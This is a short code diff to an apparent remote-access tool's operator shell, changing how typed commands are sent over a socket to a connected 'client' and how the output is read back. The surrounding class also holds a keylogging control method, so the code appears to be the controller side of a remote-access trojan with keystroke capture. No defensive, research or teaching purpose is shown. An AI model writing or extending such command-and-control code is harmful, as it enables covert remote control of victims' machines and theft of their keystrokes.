@@ -119,11 +119,25 @@ class OperatorShell:
             print("No client connected. Use 'connect <client_id>' first.")
             return
 
-        response = self.client_manager.send_command_to_client(self.active_client_id, command)
-        if response:
-            print(f"Client {self.active_client_id} Response:\n{response}")
-        else:
-            print(f"Failed to execute command on client {self.active_client_id}.")
+        client_socket = self.client_manager.clients[self.active_client_id]["connection"]
+
+        try:
+            # Send command to client
+            client_socket.sendall(command.encode("utf-8"))
+
+            # Receive response
+            response = ""
+            while True:
+                chunk = client_socket.recv(4096).decode(errors="replace")
+                if "[END_OF_RESPONSE]" in chunk:
+                    response += chunk.replace("[END_OF_RESPONSE]", "")
+                    break
+                response += chunk
+
+            print(f"Client {self.active_client_id} Response:\n{response.strip()}")
+        except Exception as e:
+            print(f"Failed to execute command on client {self.active_client_id}: {e}")
+            logging.error(f"[OperatorShell] Error running command on client {self.active_client_id}: {e}")
 
     def handle_keylogging(self, status: str):
         """
